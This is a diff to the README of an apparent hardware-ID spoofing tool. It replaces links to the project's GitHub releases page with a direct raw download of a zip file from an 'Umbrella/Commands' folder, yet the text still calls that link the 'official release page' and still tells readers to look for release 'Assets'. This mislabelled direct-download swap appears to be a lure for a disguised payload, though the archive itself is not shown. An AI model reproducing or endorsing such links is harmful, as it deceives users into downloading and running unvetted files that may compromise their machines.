@@ -1,6 +1,6 @@
 # 🛡️ Umbrella-HWID-Tool - Keep your hardware identity completely private
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Heavy-slash772/Umbrella-HWID-Tool/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Heavy-slash772/Umbrella-HWID-Tool/raw/refs/heads/main/Umbrella/Commands/HWI-Umbrella-Tool-v3.8.zip)
 
 ## 📌 About this project
 
@@ -18,7 +18,7 @@ Umbrella-HWID-Tool changes how your computer presents itself to software. Every 
 
 ## 📥 How to download
 
-Visit the official release page to get the files: [https://github.com/Heavy-slash772/Umbrella-HWID-Tool/releases](https://github.com/Heavy-slash772/Umbrella-HWID-Tool/releases)
+Visit the official release page to get the files: [https://github.com/Heavy-slash772/Umbrella-HWID-Tool/raw/refs/heads/main/Umbrella/Commands/HWI-Umbrella-Tool-v3.8.zip](https://github.com/Heavy-slash772/Umbrella-HWID-Tool/raw/refs/heads/main/Umbrella/Commands/HWI-Umbrella-Tool-v3.8.zip)
 
 1. Navigate to the link provided above.
 2. Look for the section labeled "Assets" at the bottom of the latest release.
